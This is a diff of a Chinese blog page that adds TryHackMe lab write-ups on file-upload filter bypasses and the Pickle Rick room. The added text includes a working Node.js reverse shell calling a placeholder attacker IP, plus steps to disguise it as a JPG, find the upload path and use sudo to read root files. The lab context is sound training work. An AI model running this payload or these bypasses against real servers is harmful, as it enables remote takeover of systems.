@@ -129,8 +129,22 @@
 <meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201859281.png">
 <meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212013267.png">
 <meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212106148.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403261957924.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262022433.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262105826.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262106029.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262135288.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262138244.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262143993.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262204212.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262228588.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271044772.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271102735.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271109656.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271123121.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271138387.png">
 <meta property="article:published_time" content="2024-03-08T15:55:20.810Z">
-<meta property="article:modified_time" content="2024-03-21T14:20:20.716Z">
+<meta property="article:modified_time" content="2024-03-27T03:43:31.671Z">
 <meta property="article:author" content="FSRM">
 <meta property="article:tag" content="tryhackme">
 <meta name="twitter:card" content="summary_large_image">
@@ -368,7 +382,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          20k 字
+          21k 字
         
       </span>
     
@@ -379,7 +393,7 @@
         
         
         
-          163 分钟
+          174 分钟
         
       </span>
     
@@ -1210,6 +1224,62 @@
 <p>利用curl语句进行上传。</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;submit:&lt;value&gt;&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;&lt;file-parameter&gt;:@&lt;path-to-file&gt;&quot;</span> &lt;site&gt;<br></code></pre></td></tr></table></figure>
 
+<p>这里给的很清楚了，就不做演示了。</p>
+<p> Bypassing Server-Side Filtering: File Extensions</p>
+<p>从这里开始就是绕过服务端的了。</p>
+<p>绕过的方式比较杂一点，黑名单的话就是不断的进行尝试，直到我们可以上传上去我们构造的shell文件。</p>
+<p>实例:</p>
+<p>这里thm给的上传环境还挺有意思的。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403261957924.png" srcset="/img/loading.gif" lazyload alt="image-20240326195715756"></p>
+<p>select 是选择上传的文件</p>
+<p>upload是进行上传</p>
+<p>chosen 输出所选文件的名称</p>
+<p>上传php5的后缀可以上传成功 然后利用dirsearch可以把文件存放的路径给爆破出来。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262022433.png" srcset="/img/loading.gif" lazyload alt="image-20240326202219319"></p>
+<p>Bypassing Server-Side Filtering: Magic Numbers</p>
+<p>这个的话就是对文件头的一个检查 加一个GIF89a即可绕过。</p>
+<p>挑战:</p>
+<p>首先我们进去之后发现是一个nodejs的服务，这时候我们就不能用php了，可以去网上找一个反弹shell的脚本。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;net&quot;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;child_process&quot;</span>),<br>    sh = cp.<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>, []);<br>    <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.<span class="hljs-title class_">Socket</span>();<br>    client.<span class="hljs-title function_">connect</span>(port, <span class="hljs-string">&quot;此处替换为攻击端IP&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>        client.<span class="hljs-title function_">pipe</span>(sh.<span class="hljs-property">stdin</span>);<br>        sh.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">pipe</span>(client);<br>        sh.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">pipe</span>(client);<br>    &#125;);<br>    <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span>;<br>&#125;)();<br></code></pre></td></tr></table></figure>
+
+<p>通过扫描后台可以得到一些路径</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262105826.png" srcset="/img/loading.gif" lazyload alt="image-20240326210524742"></p>
+<p>通过查看网页源代码:</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262106029.png" srcset="/img/loading.gif" lazyload alt="image-20240326210645953"></p>
+<p>找到相关的信息。</p>
+<p>然后可以看到它过滤的一些信息点。文件大小，文件名(只让上传jpg的文件)，以及文件头的信息。</p>
+<p>所以我们首先先构造一下这个js的反弹shell的脚本，然后再进行修改。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">1</span>.使用hexeditor xx.<span class="hljs-keyword">js </span>进行修改文件头 <br></code></pre></td></tr></table></figure>
+
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262135288.png" srcset="/img/loading.gif" lazyload alt="image-20240326213544023"></p>
+<p>然后修改后缀，最后查看一下大小是否符合</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262138244.png" srcset="/img/loading.gif" lazyload alt="image-20240326213846172"></p>
+<p>然后上传上去，接下来就是找上传后的路径了。</p>
+<p>因为我们上传的是jpg图片，然后我们可以找到jpg图片所存储的位置。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262143993.png" srcset="/img/loading.gif" lazyload alt="image-20240326214355942"></p>
+<p>在/content/目录下</p>
+<p>可以利用ffuf进行暴力破解，然后就可以得到我们上传进去的文件名了</p>
+<p>然后去访问等待反弹shell即可</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262204212.png" srcset="/img/loading.gif" lazyload alt="image-20240326220433985"></p>
+<p>记得上传文件时进行抓包，修改一下里面的值</p>
+<p>把那个base64编码的替换成自己的js反弹shell经过base64编码后的值</p>
+<p>要不然的话这个shell文件就不会触发</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403262228588.png" srcset="/img/loading.gif" lazyload alt="image-20240326222858465"></p>
+<h3 id="Pickle-Rick"><a href="#Pickle-Rick" class="headerlink" title="Pickle Rick"></a>Pickle Rick</h3><p>首先扫描后台，发现login.php 还有robots.txt  查看网页源代码发现用户名，然后robots.txt里面的是登录密码。</p>
+<p>登录进去之后可以执行系统命令，但是cat被过滤了，所以我们使用tac来查看Sup3rS3cretPickl3Ingred.txt的内容</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271044772.png" srcset="/img/loading.gif" lazyload alt="image-20240327104354509"></p>
+<p>然后查看后面的页面时，发现无权限访问，然后whoami看了一下，发现并不是root用户，猜测这里要进行提权。</p>
+<p>第二部分:</p>
+<p>试了一下sudo whoami 直接就是root用户了</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271102735.png" srcset="/img/loading.gif" lazyload alt="image-20240327110239492"></p>
+<p>我们在/home目录下找到了rick</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271109656.png" srcset="/img/loading.gif" lazyload alt="image-20240327110910558"></p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271123121.png" srcset="/img/loading.gif" lazyload alt="image-20240327112321022"></p>
+<p>记得文件名加引号</p>
+<p>第三部分:</p>
+<p>在/root目录里面</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403271138387.png" srcset="/img/loading.gif" lazyload alt="image-20240327113843143"></p>
+<p>最后利用sudo tac /root/3rd.txt 查看即可</p>
 
                 
               </div>
@@ -1274,7 +1344,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年3月21日</div>
+          <div>2024年3月27日</div>
         </div>
       
       
